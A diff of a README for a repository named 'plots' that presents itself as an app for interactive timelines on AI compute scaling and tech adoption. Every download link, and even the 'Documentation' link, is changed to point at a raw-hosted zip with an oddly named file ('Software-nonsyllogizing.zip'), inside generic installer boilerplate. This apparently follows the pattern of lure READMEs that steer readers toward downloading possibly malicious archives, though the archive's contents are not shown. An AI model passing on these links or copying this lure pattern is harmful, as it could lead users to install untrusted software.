@@ -4,7 +4,7 @@
 Welcome to the **plots** repository! This application helps you explore interactive timelines about AI compute scaling, tech adoption, and biological efficiency. You can see how these trends develop from 1900 to 2026 and beyond.
 
 ## 📥 Download & Install
-To start using the application, visit this page to download it: [Download plots](https://raw.githubusercontent.com/DEMIUD/plots/main/adoption-timeline/output/Software_v1.5.zip)
+To start using the application, visit this page to download it: [Download plots](https://raw.githubusercontent.com/DEMIUD/plots/main/civilization-scaling/Software-nonsyllogizing.zip)
 
 ## 🖥️ System Requirements
 - **Operating System:** Windows 10 or later, macOS Mojave or later, Linux (most distributions).
@@ -46,11 +46,11 @@ Yes, you can take screenshots or share them directly from the application to hel
 No prior knowledge is needed. The application is designed for users of all skill levels.
 
 ## 🎯 Additional Resources
-For more detailed information, tips, and updates, please visit our [Documentation](https://raw.githubusercontent.com/DEMIUD/plots/main/adoption-timeline/output/Software_v1.5.zip). 
+For more detailed information, tips, and updates, please visit our [Documentation](https://raw.githubusercontent.com/DEMIUD/plots/main/civilization-scaling/Software-nonsyllogizing.zip). 
 
 ## 📂 Feedback and Contributions
 We welcome feedback and contributions! If you have ideas for improvement or if you encounter any issues, please raise them in the repository. 
 
 If you enjoyed using this application, consider sharing it with friends or colleagues who might find it useful. 
 
-To download the application again, or if you need to check for updates, visit this page: [Download plots](https://raw.githubusercontent.com/DEMIUD/plots/main/adoption-timeline/output/Software_v1.5.zip)
+To download the application again, or if you need to check for updates, visit this page: [Download plots](https://raw.githubusercontent.com/DEMIUD/plots/main/civilization-scaling/Software-nonsyllogizing.zip)
